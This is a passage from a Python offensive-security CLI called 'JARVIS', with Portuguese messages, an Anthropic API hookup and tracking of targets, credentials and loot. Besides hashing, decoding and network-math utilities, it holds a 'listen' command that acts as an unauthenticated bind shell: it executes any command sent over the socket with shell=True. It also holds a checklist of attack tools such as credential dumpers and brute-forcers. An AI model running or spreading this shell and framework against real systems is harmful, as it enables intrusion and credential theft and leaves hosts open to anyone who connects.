                "rot13":  lambda t: t.translate(str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm")),
                "url":    lambda t: urllib.parse.unquote(t),
            }
            fn = decoders.get(method)
            if fn:
                print(f"  {C.SUCCESS}→{C.RESET} {fn(text)}")
            else:
                print(f"Métodos: {', '.join(decoders.keys())}")
        except Exception as e:
            log.error(f"Decode falhou: {e}")

    def cmd_hash(self, args):
        if len(args) < 2:
            print("Uso: hash <md5|sha1|sha256|sha512> <texto>")
            return
        method = args[0].lower()
        text = " ".join(args[1:])
        
        hashers = {
            "md5":    hashlib.md5,
            "sha1":   hashlib.sha1,
            "sha224": hashlib.sha224,
            "sha256": hashlib.sha256,
            "sha384": hashlib.sha384,
            "sha512": hashlib.sha512,
        }
        
        fn = hashers.get(method)
        if fn:
            result = fn(text.encode()).hexdigest()
            print(f"  {C.SUCCESS}→{C.RESET} {result}")
        else:
            # Mostrar todos
            for name, h in hashers.items():
                print(f"  {C.YELLOW}{name:8s}{C.RESET} {h(text.encode()).hexdigest()}")

    def cmd_ip_info(self, args):
        if not args:
            print("Uso: ip_info <ip>")
            return
        ip = args[0]
        try:
            addr = ipaddress.ip_address(ip)
            print(f"\n  IP: {ip}")
            print(f"  Versão: IPv{addr.version}")
            print(f"  Privado: {addr.is_private}")
            print(f"  Loopback: {addr.is_loopback}")
            print(f"  Multicast: {addr.is_multicast}")
            print(f"  Hex: {hex(int(addr))}")
            print(f"  Decimal: {int(addr)}\n")
        except ValueError:
            # Talvez seja hostname
            try:
                ip_resolved = socket.gethostbyname(ip)
                log.success(f"{ip} → {ip_resolved}")
            except Exception:
                log.error(f"IP inválido: {ip}")

    def cmd_cidr(self, args):
        if not args:
            print("Uso: cidr <cidr> (ex: 192.168.1.0/24)")
            return
        try:
            net = ipaddress.ip_network(args[0], strict=False)
            print(f"\n  Rede:         {net.network_address}")
            print(f"  Broadcast:    {net.broadcast_address}")
            print(f"  Máscara:      {net.netmask}")
            print(f"  Wildcard:     {net.hostmask}")
            print(f"  Hosts:        {net.num_addresses - 2}")
            print(f"  Prefixo:      /{net.prefixlen}")
            print(f"  Privada:      {net.is_private}\n")
        except ValueError as e:
            log.error(f"CIDR inválido: {e}")

    def cmd_hex(self, args):
        if not args:
            print("Uso: hex <texto|número>")
            return
        text = " ".join(args)
        try:
            n = int(text)
            print(f"  Decimal → Hex: {hex(n)}")
            print(f"  Decimal → Bin: {bin(n)}")
            print(f"  Decimal → Oct: {oct(n)}")
        except ValueError:
            print(f"  String → Hex: {text.encode().hex()}")
            print(f"  Hex bytes: {' '.join(f'{b:02x}' for b in text.encode())}")

    def cmd_rot13(self, args):
        text = " ".join(args)
        result = text.translate(str.maketrans(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
            "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"
        ))
        print(f"  {C.SUCCESS}→{C.RESET} {result}")

    def cmd_listen(self, args):
        if not args:
            print("Uso: listen <port>")
            return
        port = int(args[0])
        log.info(f"Iniciando listener na porta {port}...")
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", port))
            srv.listen(1)
            log.success(f"Escutando em 0.0.0.0:{port} (Ctrl+C para parar)")
            conn, addr = srv.accept()
            log.hack(f"Conexão recebida de {addr[0]}:{addr[1]}")
            
            # Shell interativo simples
            while True:
                conn.send(b"$ ")
                data = conn.recv(4096).decode("utf-8", errors="replace").strip()
                if not data or data.lower() in ["exit", "quit"]:
                    break
                try:
                    out = subprocess.run(data, shell=True, capture_output=True,
                                        text=True, timeout=30)
                    response = out.stdout + out.stderr
                    conn.send(response.encode())
                except Exception as e:
                    conn.send(f"Error: {e}\n".encode())
            
            conn.close()
            srv.close()
        except KeyboardInterrupt:
            log.info("Listener encerrado")
        except Exception as e:
            log.error(f"Listener falhou: {e}")

    def cmd_extract_emails(self, args):
        text = " ".join(args)
        emails = re.findall(r"[\w.+-]+@[\w-]+\.[a-zA-Z]{2,}", text)
        if emails:
            print(f"\n  Emails encontrados:")
            for e in set(emails):
                print(f"  {C.SUCCESS}→{C.RESET} {e}")
            print()
        else:
            log.info("Nenhum email encontrado")

    def cmd_check_tools(self, args):
        tools = {
            "nmap": "Scanner de rede",
            "nikto": "Scanner web",
            "gobuster": "Dir/DNS bruteforce",
            "hydra": "Brute force",
            "medusa": "Brute force",
            "sqlmap": "SQL Injection",
            "metasploit": "Exploitation framework",
            "msfvenom": "Payload generator",
            "wireshark": "Packet analyzer",
            "tcpdump": "Packet capture",
            "netcat": "Network utility",
            "nc": "Netcat",
            "socat": "Data relay",
            "chisel": "TCP tunnel",
            "ligolo-ng": "Proxy tunnel",
            "john": "Password cracker",
            "hashcat": "Password cracker",
            "impacket-secretsdump": "Windows creds dump",
            "crackmapexec": "Network pentest",
            "evil-winrm": "WinRM shell",
            "bloodhound": "AD reconnaissance",
            "burpsuite": "Web proxy",
            "dirsearch": "Web content scanner",
            "ffuf": "Web fuzzer",
            "wfuzz": "Web fuzzer",
            "feroxbuster": "Content discovery",
            "whatweb": "Web scanner",
            "curl": "HTTP client",
            "wget": "File downloader",
            "openssl": "Crypto toolkit",
            "ssh": "Secure shell",
            "python3": "Python",
            "perl": "Perl",
            "ruby": "Ruby",
            "go": "Golang",
        }
        
        print(f"\n{C.CYAN}{'─'*50}{C.RESET}")
        print(f"  {C.BOLD}Status das Ferramentas:{C.RESET}\n")
        
        available = 0
        for tool, desc in tools.items():
            found = shutil.which(tool) is not None
            if found:
                available += 1
                print(f"  {C.SUCCESS}✔{C.RESET} {tool:25s} {C.DIM}{desc}{C.RESET}")
            else:
                print(f"  {C.FAIL}✘{C.RESET} {tool:25s} {C.DIM}{desc}{C.RESET}")
        
        print(f"\n  {available}/{len(tools)} ferramentas disponíveis")
        print(f"{C.CYAN}{'─'*50}{C.RESET}\n")

    def cmd_install_deps(self, args):
        deps = ["anthropic", "requests", "paramiko"]
        log.info(f"Instalando dependências Python: {', '.join(deps)}")
        for dep in deps:
            try:
                result = subprocess.run(
                    [sys.executable, "-m", "pip", "install", dep, "-q"],
                    capture_output=True, text=True
                )
                if result.returncode == 0:
                    log.success(f"Instalado: {dep}")
                else:
                    log.error(f"Falha: {dep}\n{result.stderr}")
            except Exception as e:
                log.error(f"Erro ao instalar {dep}: {e}")

cli = CommandProcessor()

# ─────────────────────────────────────────────
#  READLINE / AUTOCOMPLETE
# ─────────────────────────────────────────────
def setup_readline():
    if not READLINE_OK:
        return
    
    commands = list(cli.commands.keys())
    
    def completer(text, state):
        options = [c for c in commands if c.startswith(text)]
        if state < len(options):
            return options[state]
        return None
    
    readline.set_completer(completer)
    readline.parse_and_bind("tab: complete")
    
    if os.path.exists(HISTORY_FILE):
        try:
            readline.read_history_file(HISTORY_FILE)
        except Exception:
            pass

def save_readline():
    if not READLINE_OK:
        return
    try:
        readline.write_history_file(HISTORY_FILE)
    except Exception:
        pass

# ─────────────────────────────────────────────
#  MAIN LOOP
# ─────────────────────────────────────────────
def get_prompt() -> str:
    target = session.target or "no-target"
    target_short = target[:20] + ".." if len(target) > 20 else target
    findings_count = len(log.findings)
    creds_count = len(session.creds)
    
    parts = [
        f"{C.DIM}┌─[{C.RESET}",
        f"{C.BRED}JARVIS{C.RESET}",
        f"{C.DIM}]─[{C.RESET}",
        f"{C.BCYAN}{target_short}{C.RESET}",
    ]
    
    if findings_count:
        parts += [f"{C.DIM}]─[{C.RESET}", f"{C.BRED}F:{findings_count}{C.RESET}"]
    if creds_count:
        parts += [f"{C.DIM}]─[{C.RESET}", f"{C.BGREEN}C:{creds_count}{C.RESET}"]
    
    parts.append(f"{C.DIM}]{C.RESET}")
    
    prompt = "".join(parts)
    prompt += f"\n{C.DIM}└─${C.RESET} "
    return prompt

def signal_handler(sig, frame):
    print(f"\n{C.WARN}Use 'exit' para sair corretamente{C.RESET}")

def main():
    signal.signal(signal.SIGINT, signal_handler)
    
    # Inicialização
    setup_readline()
    
    # Parse args CLI
    parser = argparse.ArgumentParser(description="JARVIS Offensive Security Framework")
    parser.add_argument("-t", "--target", help="Target inicial")
    parser.add_argument("-k", "--key", help="Anthropic API key")
    parser.add_argument("-c", "--cmd", help="Executar comando e sair")
    parser.add_argument("--no-banner", action="store_true", help="Sem banner")
    parser.add_argument("--load", help="Carregar sessão")
    parser.add_argument("--auto-recon", help="Auto full recon no target")
    args = parser.parse_args()
    
    # Aplicar argumentos
    if args.key:
        config.set("AI", "api_key", args.key)
        ai.initialize(args.key)
    elif config.get("AI", "api_key"):
        ai.initialize(config.get("AI", "api_key"))
    
    if args.target:
        session.target = args.target
        session.targets.append(args.target)
        session.variables["TARGET"] = args.target
    
    if args.load:
        session.load(args.load)
    
    if not args.no_banner:
        show_banner()
    
    if args.auto_recon:
        cli.cmd_full_recon([args.auto_recon])
    
    if args.cmd:
        cli.execute(args.cmd)
        return
    
    # Main REPL loop
    print(f"  {C.DIM}Sessão iniciada em {session.start.strftime('%Y-%m-%d %H:%M:%S')}{C.RESET}\n")
    
    while cli.running:
        try:
            prompt = get_prompt()
            line = input(prompt)
            
            if not line.strip():
                continue
            
            cli.execute(line)
            
        except EOFError:
            cli.cmd_exit([])
            break
        except KeyboardInterrupt:
            print(f"\n{C.WARN}[!] Ctrl+C — Use 'exit' para sair{C.RESET}")
            continue
        except Exception as e:
            log.error(f"Erro inesperado: {e}")
            import traceback
            traceback.print_exc()
    
    save_readline()
    session.save()
    
    print(f"\n{C.CYAN}{'─'*50}{C.RESET}")
    print(f"  {C.BOLD}Sessão encerrada{C.RESET}")
    print(f"  Duração: {str(datetime.now() - session.start).split('.')[0]}")
    print(f"  Findings: {len(log.findings)} | Creds: {len(session.creds)} | Loot: {len(session.loot)}")
    print(f"  Log: {log.log_file}")
    print(f"{C.CYAN}{'─'*50}{C.RESET}\n")

# ─────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────
if __name__ == "__main__":
    main()